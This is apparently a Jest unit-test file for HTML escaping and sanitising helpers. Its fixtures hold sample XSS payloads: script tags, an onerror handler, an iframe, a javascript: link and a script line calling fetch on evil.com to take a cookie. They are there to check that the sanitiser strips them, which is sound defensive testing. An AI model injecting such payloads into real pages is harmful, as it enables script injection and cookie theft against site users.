import { escapeHtml, stripDangerousHtmlTags } from './html.util';

describe('html.util', () => {
  describe('escapeHtml', () => {
    it('should escape HTML special characters correctly', () => {
      const input = '<script>alert("XSS & attack\'s")</script>';
      const expected = '&lt;script&gt;alert(&quot;XSS &amp; attack&#039;s&quot;)&lt;/script&gt;';
      expect(escapeHtml(input)).toBe(expected);
    });

    it('should handle null and undefined safely', () => {
      expect(escapeHtml(null)).toBe('');
      expect(escapeHtml(undefined)).toBe('');
    });

    it('should convert numbers to string without altering digits', () => {
      expect(escapeHtml(12345)).toBe('12345');
      expect(escapeHtml(0)).toBe('0');
    });

    it('should preserve plain strings without HTML characters', () => {
      expect(escapeHtml('Kompyuter HP ProBook 450 G8')).toBe('Kompyuter HP ProBook 450 G8');
    });
  });

  describe('stripDangerousHtmlTags', () => {
    it('should remove <script> tags and inner code', () => {
      const input = '<div>Safe</div><script>fetch("http://evil.com/cookie")</script><p>Text</p>';
      expect(stripDangerousHtmlTags(input)).toBe('<div>Safe</div><p>Text</p>');
    });

    it('should remove inline event handlers', () => {
      const input = '<img src="x" onerror="alert(1)" /><button onclick="evil()">Click</button>';
      const cleaned = stripDangerousHtmlTags(input);
      expect(cleaned).not.toContain('onerror');
      expect(cleaned).not.toContain('onclick');
      expect(cleaned).toContain('<img src="x"');
      expect(cleaned).toContain('<button>Click</button>');
    });

    it('should remove iframe, object, and embed tags', () => {
      const input = '<div><iframe src="http://evil.com"></iframe><embed src="test.swf" /></div>';
      const cleaned = stripDangerousHtmlTags(input);
      expect(cleaned).not.toContain('<iframe');
      expect(cleaned).not.toContain('<embed');
      expect(cleaned).toBe('<div></div>');
    });

    it('should sanitize javascript: links', () => {
      const input = '<a href="javascript:alert(1)">Click me</a>';
      expect(stripDangerousHtmlTags(input)).toBe('<a href="#">Click me</a>');
    });

    it('should handle null or empty values', () => {
      expect(stripDangerousHtmlTags(null)).toBe('');
      expect(stripDangerousHtmlTags('')).toBe('');
    });
  });
});
